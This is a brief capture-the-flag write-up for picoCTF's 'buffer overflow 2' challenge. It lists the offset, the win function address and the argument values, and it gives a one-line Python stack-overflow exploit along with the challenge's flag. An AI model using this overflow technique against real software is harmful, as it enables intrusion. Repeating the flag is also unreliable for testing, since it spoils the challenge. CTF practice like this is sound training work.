> buffer overflow 2 - Points: 250 - (Solves: 186)
> Alright, this time you'll need to control some arguments. Can you get the flag from this program? You can find it in /problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa on the shell server. Source.

Buffer size 100

Argument 1 needs to be `0xDEADBEEF`
Argument 2 needs to be `0xDEADC0DE`

Win function at `080485cb <win>:`

Final offset = 112

Exploit : `./vuln < <(python -c "print 'A'*112 + '\xcb\x85\x04\x08' + 'AAAA' + '\xef\xbe\xad\xde' + '\xde\xc0\xad\xde'")`

Flag: `picoCTF{addr3ss3s_ar3_3asy1b78b0d8}`
